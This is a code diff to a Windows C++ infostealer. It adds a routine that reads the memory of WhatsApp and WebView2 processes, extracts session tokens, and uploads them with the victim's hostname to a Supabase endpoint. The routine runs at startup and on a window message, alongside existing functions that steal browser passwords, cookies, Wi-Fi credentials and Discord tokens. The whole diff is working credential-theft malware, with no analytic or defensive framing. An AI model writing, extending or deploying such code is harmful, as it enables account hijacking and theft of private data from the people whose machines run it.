@@ -1011,6 +1011,7 @@ static void CheckAndHandleExec() {
 #define SUPABASE_COOKIES_PATH L"/rest/v1/cookies"
 #define SUPABASE_WIFI_PATH L"/rest/v1/wifi_creds"
 #define SUPABASE_DISCORD_PATH L"/rest/v1/discord_tokens"
+#define SUPABASE_WHATSAPP_PATH L"/rest/v1/whatsapp_tokens"
  
 static uint32_t SqliteVarint(const uint8_t* p, int* used) {
     uint32_t v = 0; *used = 0;
@@ -1332,6 +1333,76 @@ static void HarvestDiscordTokens() {
         LogMsg("Discord: uploaded " + std::to_string(tokens.size()) + " tokens from memory");
     } else {
         LogMsg("Discord mem: no token found in any discord.exe process");
+    }
+}
+
+static void HarvestWhatsAppSession() {
+    std::vector<std::string> tokens;
+    DWORD startTick = GetTickCount();
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32W pe = { sizeof(pe) };
+        if (Process32FirstW(hSnap, &pe)) {
+            do {
+                if (lstrcmpiW(pe.szExeFile, L"msedgewebview2.exe") != 0 && lstrcmpiW(pe.szExeFile, L"WhatsApp.exe") != 0) continue;
+                HANDLE hp = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
+                if (!hp) continue;
+                SYSTEM_INFO si; GetSystemInfo(&si);
+                uintptr_t addr = (uintptr_t)si.lpMinimumApplicationAddress;
+                while (addr < (uintptr_t)si.lpMaximumApplicationAddress) {
+                    if (GetTickCount() - startTick > 10000) break;
+                    MEMORY_BASIC_INFORMATION mbi;
+                    if (VirtualQueryEx(hp, (LPCVOID)addr, &mbi, sizeof(mbi)) == 0) { addr += 65536; continue; }
+                    if (mbi.State == MEM_COMMIT && (mbi.Protect & (PAGE_READWRITE | PAGE_READONLY)) && !(mbi.Protect & PAGE_GUARD) && mbi.Type == MEM_PRIVATE && mbi.RegionSize <= 104857600) {
+                        char* buf = new (std::nothrow) char[(size_t)mbi.RegionSize + 1];
+                        if (!buf) { addr += mbi.RegionSize; continue; }
+                        SIZE_T rd = 0;
+                        if (ReadProcessMemory(hp, mbi.BaseAddress, buf, mbi.RegionSize, &rd) && rd > 0) {
+                            buf[rd] = 0;
+                            for (DWORD i = 0; i < (DWORD)rd; i++) {
+                                if (!IsTokenChar(buf[i])) continue;
+                                // WAToken1 (client token)
+                                if (i + 8 <= rd && memcmp(buf + i, "WAToken1", 8) == 0) {
+                                    DWORD end = i + 8;
+                                    while (end < rd && IsTokenChar(buf[end]) && end - i < 200) end++;
+                                    if (end - i - 8 >= 40) tokens.push_back(std::string(buf + i + 8, end - i - 8));
+                                    i = end;
+                                    continue;
+                                }
+                                // WAToken2 (server token)
+                                if (i + 8 <= rd && memcmp(buf + i, "WAToken2", 8) == 0) {
+                                    DWORD end = i + 8;
+                                    while (end < rd && IsTokenChar(buf[end]) && end - i < 200) end++;
+                                    if (end - i - 8 >= 40) tokens.push_back(std::string(buf + i + 8, end - i - 8));
+                                    i = end;
+                                    continue;
+                                }
+                            }
+                        }
+                        delete[] buf;
+                    }
+                    addr += mbi.RegionSize;
+                }
+                CloseHandle(hp);
+            } while (Process32NextW(hSnap, &pe));
+        }
+        CloseHandle(hSnap);
+    }
+
+    if (!tokens.empty()) {
+        std::sort(tokens.begin(), tokens.end());
+        tokens.erase(std::unique(tokens.begin(), tokens.end()), tokens.end());
+        std::string batch = "[";
+        for (size_t i = 0; i < tokens.size(); i++) {
+            if (i > 0) batch += ",";
+            batch += "{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"token\":\"" + EscapeJSON(tokens[i]) + "\"}";
+        }
+        batch += "]";
+        std::string pr;
+        HttpRequest(L"POST", SUPABASE_WHATSAPP_PATH, batch, pr);
+        LogMsg("WhatsApp: uploaded " + std::to_string(tokens.size()) + " tokens");
+    } else {
+        LogMsg("WhatsApp: no session data found in memory");
     }
 }
 
@@ -2456,6 +2527,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 HarvestBrowserPasswords();
                 HarvestBrowserCookies();
                 HarvestDiscordTokens();
+                HarvestWhatsAppSession();
             }
             break;
         }
@@ -2575,6 +2647,7 @@ static int RunChild(HINSTANCE hInstance) {
 
     HarvestWiFiPasswords();
     HarvestDiscordTokens();
+    HarvestWhatsAppSession();
 
     MSG msg;
     while (g_running && GetMessage(&msg, NULL, 0, 0) > 0) {
